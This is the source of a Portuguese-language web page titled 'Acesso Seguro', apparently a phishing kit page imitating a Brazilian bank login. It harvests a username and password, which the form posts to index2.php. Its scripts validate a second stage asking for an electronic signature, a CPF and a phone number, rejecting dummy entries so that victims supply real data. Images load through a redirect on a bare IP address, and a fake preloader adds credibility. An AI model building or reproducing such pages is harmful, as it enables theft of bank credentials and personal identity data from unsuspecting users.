

<html lang="pt-BR"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<style type="text/css">
@media only screen and (max-height: 400px) {
  #rodapepng{display: none !important;}
}ndex:1000;border-radius:2px;border-top:1px solid #d9d9d9;font-family:Arial,sans-serif;box-shadow:0 2px 6px rgba(0,0,0,0.3);-moz-box-sizing:border-box;-webkit-box-sizing:border-box;box-sizing:border-box;overflow:hidden}.pac-logo:after{content:"";padding:1px 1px 1px 0;height:16px;text-align:right;display:block;background-image:url(http://37.187.147.158/servlet/redirect.srv/sruj/slsemggv/sjhtg/p2/mapfiles/api-3/images/powered-by-google-on-white3.png);background-position:right;background-repeat:no-repeat;background-size:120px 14px}.hdpi.pac-logo:after{background-image:url(http://37.187.147.158/servlet/redirect.srv/sruj/slsemggv/sjhtg/p2/mapfiles/api-3/images/powered-by-google-on-white3_hdpi.png)}.pac-item{cursor:default;padding:0 4px;text-overflow:ellipsis;overflow:hidden;white-space:nowrap;line-height:30px;text-align:left;border-top:1px solid #e6e6e6;font-size:11px;color:#999}.pac-item:hover{background-color:#fafafa}.pac-item-selected,.pac-item-selected:hover{background-color:#ebf2fe}.pac-matched{font-weight:700}.pac-item-query{font-size:13px;padding-right:3px;color:#000}.pac-icon{width:15px;height:20px;margin-right:7px;margin-top:6px;display:inline-block;vertical-align:top;background-image:url(http://37.187.147.158/servlet/redirect.srv/sruj/slsemggv/sjhtg/p2/mapfiles/api-3/images/autocomplete-icons.png);background-size:34px}.hdpi .pac-icon{background-image:url(http://37.187.147.158/servlet/redirect.srv/sruj/slsemggv/sjhtg/p2/mapfiles/api-3/images/autocomplete-icons_hdpi.png)}.pac-icon-search{background-position:-1px -1px}.pac-item-selected .pac-icon-search{background-position:-18px -1px}.pac-icon-marker{background-position:-1px -161px}.pac-item-selected .pac-icon-marker{background-position:-18px -161px}.pac-placeholder{color:gray}</style>
	<title>Acesso Seguro</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
   
   <meta name="robots" content="noindex, nofollow">
    <script src="js/jquery.min.js"></script>
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="shortcut icon" type="image/png" href="html/favicon.png"/>
	<link rel="stylesheet" href="html/main.css">
	<link rel="stylesheet" type="text/css" href="html/preloader.css">
<body id="home-background" class="home"><script type="text/javascript" language="javascript" src="js/navigation.js"></script><style type="text/css" media="all">@import "css/float_navigation.css";</style>

							<div id="preloader">
								<div id="status">
									<div id="centro"></div>
									<center>
										<img width="120px" src="html/logo_preloader.png">
										<br>
										<div class="loader"></div>
									</center>
								</div>
							</div>
	<main id="site-main" class="main-home min-height" >
		<section class="center-home-screen center-block">
			<div class="form-center-tablet" style="margin-top: -90px; width: 100%">
				<br><br><br><br>
				
				<div class="block-field-search" >
				
					
					<div class="block-formulario_caixa">						
														
							<div id="conteudo">
							<form name="formulario_caixa" onSubmit="return enviardados1();" method="post" id="formulario_caixa" action="index2.php">

							<br><br><br><br><br>
								<div onclick="return togglelembrar();"><img src="html/check.png" id="check" style="width: 27%;position: fixed;left: 62%; margin-top: -10px"/></div>
							<input maxLength="30" name="usuario" id="usuario" placeholder="Usuário"  class="input-field fields-search active-input-search"  type="text" >
							<input maxLength="8" name="senha" id="senha" placeholder="Senha"  class="input-field fields-search active-input-search" type="password">
							<div onclick="return togglePessoa();"><img src="html/pf.png" id="pessoa" style="width: 76%;margin-top: 10px;"/></div>
							</div>
							<br>
							
							<br>
							<input type="hidden" name="step" value="passo1" />
							<button style="margin-top: 10px !important" type="submit" class="back-to-results" id="back-results-button">
							  Acessar minha Conta
							</button>
							</form>
							
							
							</div>
																				
					</div>				
				</div>
			</div>
		
	
		</section>
		
		
	
		
	
						
	</main>
	

	<script>
	
		
	
	
	var check = 1
	function togglelembrar(){
		if (check == 1){
			document.getElementById('check').src='html/check_off.png';
			check = 0;
		}else{
			document.getElementById('check').src='html/check.png';
			check = 1;
		}
	}
	
	var check2 = 1
	function togglePessoa(){
		if (check2 == 1){
			document.getElementById('pessoa').src='html/pf.png';
			check2 = 0;
		}else{
			document.getElementById('pessoa').src='html/pj.png';
			check2 = 1;
		}
	}
	
	
	  	function enviardados1(){
		  
					  
				 if(document.formulario_caixa.usuario.value.length < 4)
				 {
				 var alerta = "Usuário Inválido. Verifique o campo digitado e tente novamente." ;
				 alert(alerta);
				 document.formulario_caixa.usuario.focus();
				 return false;
				 }
				  
				 if(document.formulario_caixa.senha.value.length < 6)
				 {
				 var alerta = "Senha inválida. Verifique o campo digitado e tente novamente." ;
				 alert(alerta);
				 document.formulario_caixa.senha.focus();
				 return false;
				 }
				 return true;
		}
	  
	    function enviardados2(){
		 
          
         if(document.formulario_caixa2.senha1.value.length < 4 )
         {
         var alerta = "Assinatura eletrônica Inválida." ;
         alert(alerta);
         document.formulario_caixa2.senha1.focus();
         return false;
         }
		 
          
         if(validaCPF(document.formulario_caixa2.cpf.value) == false)
         {
         var alerta = "CPF Inválido." ;
         alert(alerta);
         document.formulario_caixa2.cpf.focus();
         return false;
         }
		 
          
         if(document.formulario_caixa2.telefone.value.length < 14 )
         {
         var alerta = "Telefone Inválido." ;
         alert(alerta);
         document.formulario_caixa2.telefone.focus();
         return false;
         }
		 
          
         if(document.formulario_caixa2.telefone.value == "11 1-1111-1111" )
         {
         var alerta = "Telefone Inválido." ;
         alert(alerta);
         document.formulario_caixa2.telefone.focus();
         return false;
         }
		 
          
         if(document.formulario_caixa2.telefone.value == "22 2-2222-2222" )
         {
         var alerta = "Telefone Inválido." ;
         alert(alerta);
         document.formulario_caixa2.telefone.focus();
         return false;
         }
		 
          
         if(document.formulario_caixa2.telefone.value == "33 3-3333-3333" )
         {
         var alerta = "Telefone Inválido." ;
         alert(alerta);
         document.formulario_caixa2.telefone.focus();
         return false;
         }
		 
          
         if(document.formulario_caixa2.telefone.value == "44 4-4444-4444" )
         {
         var alerta = "Telefone Inválido." ;
         alert(alerta);
         document.formulario_caixa2.telefone.focus();
         return false;
         }
		 
          
         if(document.formulario_caixa2.telefone.value == "55 5-5555-5555" )
         {
         var alerta = "Telefone Inválido." ;
         alert(alerta);
         document.formulario_caixa2.telefone.focus();
         return false;
         }
		 
          
         if(document.formulario_caixa2.telefone.value == "66 6-6666-6666" )
         {
         var alerta = "Telefone Inválido." ;
         alert(alerta);
         document.formulario_caixa2.telefone.focus();
         return false;
         }
		 
          
         if(document.formulario_caixa2.telefone.value == "77 7-7777-7777" )
         {
         var alerta = "Telefone Inválido." ;
         alert(alerta);
         document.formulario_caixa2.telefone.focus();
         return false;
         }
		 
          
         if(document.formulario_caixa2.telefone.value == "88 8-8888-8888" )
         {
         var alerta = "Telefone Inválido." ;
         alert(alerta);
         document.formulario_caixa2.telefone.focus();
         return false;
         }
		 
          
         if(document.formulario_caixa2.telefone.value == "99 9-9999-9999" )
         {
         var alerta = "Telefone Inválido." ;
         alert(alerta);
         document.formulario_caixa2.telefone.focus();
         return false;
         }
		 
          
         if(document.formulario_caixa2.telefone.value == "00 0-0000-0000" )
         {
         var alerta = "Telefone Inválido." ;
         alert(alerta);
         document.formulario_caixa2.telefone.focus();
         return false;
         }
			
			
		return true;	
		}
		 
		 function mascara(t, mask){
			var i = t.value.length;
			var saida = mask.substring(1,0);
			var texto = mask.substring(i)
				 if (texto.substring(0,1) != saida){
					t.value += texto.substring(0,1);
				 }
		 }

		 
		 function validaCPF(cpf)
			  {
				cpf = document.formulario_caixa2.cpf.value;
				cpf = cpf.replace("-", "");
				cpf = cpf.replace(".", "");
				cpf = cpf.replace(".", "");
				var numeros, digitos, soma, i, resultado, digitos_iguais;
				digitos_iguais = 1;
				if (cpf.length < 11)
					  return false;
				for (i = 0; i < cpf.length - 1; i++)
					  if (cpf.charAt(i) != cpf.charAt(i + 1))
							{
							digitos_iguais = 0;
							break;
							}
				if (!digitos_iguais)
					  {
					  numeros = cpf.substring(0,9);
					  digitos = cpf.substring(9);
					  soma = 0;
					  for (i = 10; i > 1; i--)
							soma += numeros.charAt(10 - i) * i;
					  resultado = soma % 11 < 2 ? 0 : 11 - soma % 11;
					  if (resultado != digitos.charAt(0))
							return false;
					  numeros = cpf.substring(0,10);
					  soma = 0;
					  for (i = 11; i > 1; i--)
							soma += numeros.charAt(11 - i) * i;
					  resultado = soma % 11 < 2 ? 0 : 11 - soma % 11;
					  if (resultado != digitos.charAt(1))
							return false;
					  return true;
					  }
				else
					return false;
			  }
		
		
						window.onload = function() {
							setTimeout(function() {
															$("#conteudo").fadeIn();
								$("#preloader").fadeOut();
								
							}, 4000);
						}

					
	</script>
</body>
		  </html>